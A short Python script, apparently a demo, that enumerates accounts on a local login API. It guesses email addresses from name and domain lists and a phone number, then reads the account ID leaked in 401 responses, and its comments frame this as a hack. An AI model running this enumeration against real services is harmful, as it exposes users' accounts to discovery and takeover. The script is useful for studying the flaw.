import requests


def check_login_validity(login: str) -> str:
    
    r = requests.post(
        url = "http://localhost:8080/api/login/", 
        json = {
            'userInput': login,
            'password': 'fakePass'
            })
    
    if r.status_code == 401:
        return r.json()['accountId']
    
    return None
   

def guess_email(fname: str, lname: str, domain: str) -> None:
    
    guesses = [ ]
    modifiers = [ '', '.', '_' ]

    for modifier in modifiers:
        guesses.append(fname + modifier + lname + domain)
        guesses.append(lname + modifier + fname + domain)

    for guess in guesses:
        accountId = check_login_validity(guess)
        if accountId is not None:
            print(accountId)


def guess_phone(area_code: str) -> None:

    # TODO: Create O(N^7) loop checking all phone numbers in the area code

    accountId = check_login_validity(area_code + '9972323')
    if accountId is not None:
        print(accountId)


# Common email formats (for our purposes)
#   1. first_name.last_name@domain.com
#   2. last_name.first_name@domain.com
#   
# Note: There are many common formats, and a real hack will involve a large volume of attempts

first_names = [ 'michelle', 'kevin', 'mark', 'jane', 'morgan', 'alexis', 'alexandria']
last_names = ['doe', 'cho', 'nguyen', 'montoya', 'oleary', 'cuban', 'ocasio-cortez']
email_domains = ['@gmail.com', '@yahoo.com', '@outlook.com']

for fname in first_names:
    for lname in last_names:
        for domain in email_domains:
            guess_email(fname, lname, domain)


# We can do a similar attack for phone numbers, but 
#  I'll only target one SF area code

guess_phone('650')